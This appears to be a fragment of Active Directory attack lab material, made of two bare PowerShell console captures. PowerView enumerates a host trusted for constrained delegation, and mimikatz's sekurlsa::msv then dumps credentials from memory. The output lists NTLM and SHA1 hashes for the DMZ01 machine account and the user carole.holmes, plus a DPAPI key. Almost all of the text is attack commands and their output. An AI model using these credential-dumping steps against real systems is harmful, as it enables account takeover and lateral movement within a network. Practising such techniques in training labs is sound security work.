

```batch
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainComputer -TrustedToAuth


logoncount                    : 67
badpasswordtime               : 9/22/2024 10:08:53 PM
distinguishedname             : CN=DMZ01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 9/22/2024 9:53:56 PM
objectsid                     : S-1-5-21-1870146311-1183348186-593267556-1118
samaccountname                : DMZ01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : DMZ01
accountexpires                : NEVER
whenchanged                   : 9/23/2024 3:06:48 AM
instancetype                  : 4
usncreated                    : 12870
objectguid                    : eaebb114-2638-40ec-9617-8715c4d3057a
operatingsystem               : Windows Server 2019 Standard
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 6:00:00 PM
msds-allowedtodelegateto      : {www/WS01.INLANEFREIGHT.LOCAL, www/WS01}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {tapinego/DMZ01, tapinego/DMZ01.INLANEFREIGHT.LOCAL, WSMAN/DMZ01, WSMAN/DMZ01.INLANEFREIGHT.LOCAL...}
lastlogon                     : 9/22/2024 10:41:06 PM
iscriticalsystemobject        : False
usnchanged                    : 143516
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated                   : 10/14/2022 12:10:03 PM
primarygroupid                : 515
pwdlastset                    : 9/22/2024 10:06:48 PM
msds-supportedencryptiontypes : 28
name                          : DMZ01
dnshostname                   : DMZ01.INLANEFREIGHT.LOCAL
```

```batch
PS C:\Tools> .\mimikatz.exe privilege::debug sekurlsa::msv exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::msv

Authentication Id : 0 ; 389527 (00000000:0005f197)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/22/2024 9:58:40 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : DMZ01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 81322a06e7a6d0f8764531bc8c52fa66
         * SHA1     : f9232403611aa86f51a05c64e1abd86ce4021ff1

Authentication Id : 0 ; 70127 (00000000:000111ef)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/22/2024 9:51:46 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DMZ01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 81322a06e7a6d0f8764531bc8c52fa66
         * SHA1     : f9232403611aa86f51a05c64e1abd86ce4021ff1

Authentication Id : 0 ; 413103 (00000000:00064daf)
Session           : RemoteInteractive from 2
User Name         : carole.holmes
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 9/22/2024 9:58:41 PM
SID               : S-1-5-21-1870146311-1183348186-593267556-1106
        msv :
         [00000003] Primary
         * Username : carole.holmes
         * Domain   : INLANEFREIGHT
         * NTLM     : 37ef72fcf42a4021948c7ed7b33ccf21
         * SHA1     : 78c2ae990df6691d1b07249c1c261522bcc8a8a4
         * DPAPI    : 25a764a34f8d9ea6128fea463abfefa1

Authentication Id : 0 ; 389492 (00000000:0005f174)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/22/2024 9:58:40 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : DMZ01$
         * Domain   : INLANEFREIGHT
         * NTLM     : de20f9a4515279467fe6c65f4641729d
         * SHA1     : 5c0df9136dd53c263839e5c3c93c4b960cd5dfc9

Authentication Id : 0 ; 39683 (00000000:00009b03)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 9/22/2024 9:51:45 PM
SID               :
        msv :
         [00000003] Primary
         * Username : DMZ01$
         * Domain   : INLANEFREIGHT
         * NTLM     : de20f9a4515279467fe6c65f4641729d
         * SHA1     : 5c0df9136dd53c263839e5c3c93c4b960cd5dfc9

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DMZ01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 9/22/2024 9:51:45 PM
SID               : S-1-5-18
        msv :

Authentication Id : 0 ; 388011 (00000000:0005ebab)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/22/2024 9:58:40 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : DMZ01$
         * Domain   : INLANEFREIGHT
         * NTLM     : de20f9a4515279467fe6c65f4641729d
         * SHA1     : 5c0df9136dd53c263839e5c3c93c4b960cd5dfc9

Authentication Id : 0 ; 70109 (00000000:000111dd)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/22/2024 9:51:46 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DMZ01$
         * Domain   : INLANEFREIGHT
         * NTLM     : de20f9a4515279467fe6c65f4641729d
         * SHA1     : 5c0df9136dd53c263839e5c3c93c4b960cd5dfc9

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DMZ01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 9/22/2024 9:51:46 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DMZ01$
         * Domain   : INLANEFREIGHT
         * NTLM     : de20f9a4515279467fe6c65f4641729d
         * SHA1     : 5c0df9136dd53c263839e5c3c93c4b960cd5dfc9

Authentication Id : 0 ; 40784 (00000000:00009f50)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/22/2024 9:51:46 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : DMZ01$
         * Domain   : INLANEFREIGHT
         * NTLM     : de20f9a4515279467fe6c65f4641729d
         * SHA1     : 5c0df9136dd53c263839e5c3c93c4b960cd5dfc9

Authentication Id : 0 ; 413149 (00000000:00064ddd)
Session           : RemoteInteractive from 2
User Name         : carole.holmes
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 9/22/2024 9:58:41 PM
SID               : S-1-5-21-1870146311-1183348186-593267556-1106
        msv :
         [00000003] Primary
         * Username : carole.holmes
         * Domain   : INLANEFREIGHT
         * NTLM     : 37ef72fcf42a4021948c7ed7b33ccf21
         * SHA1     : 78c2ae990df6691d1b07249c1c261522bcc8a8a4
         * DPAPI    : 25a764a34f8d9ea6128fea463abfefa1

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/22/2024 9:51:46 PM
SID               : S-1-5-19
        msv :

Authentication Id : 0 ; 40829 (00000000:00009f7d)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/22/2024 9:51:46 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : DMZ01$
         * Domain   : INLANEFREIGHT
         * NTLM     : de20f9a4515279467fe6c65f4641729d
         * SHA1     : 5c0df9136dd53c263839e5c3c93c4b960cd5dfc9

mimikatz(commandline) # exit
Bye!
PS C:\Tools>
``
